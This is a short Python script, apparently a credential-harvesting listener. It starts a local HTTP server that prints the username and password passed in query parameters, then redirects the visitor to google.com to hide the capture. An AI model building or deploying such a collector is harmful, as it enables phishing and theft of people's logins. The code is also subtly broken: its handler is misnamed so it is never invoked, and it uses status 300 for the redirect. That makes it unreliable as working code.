from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

host_name = "localhost"
server_port = 4001
class MyServer(SimpleHTTPRequestHandler):
    def GET_Request(self):
        queries = parse_qs(urlparse(self.path).query)
        print("Username: %s, Password: %s"%(queries["user"][0],queries["password"][0]))
        self.send_response(300)
        self.send_header("Location", "http://www.google.com")
        self.end_headers()

if __name__ == "__main__":
    webServer = HTTPServer((host_name, server_port), MyServer)
    print("Server started http://%s:%s" % (host_name, server_port))

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("Server stopped.")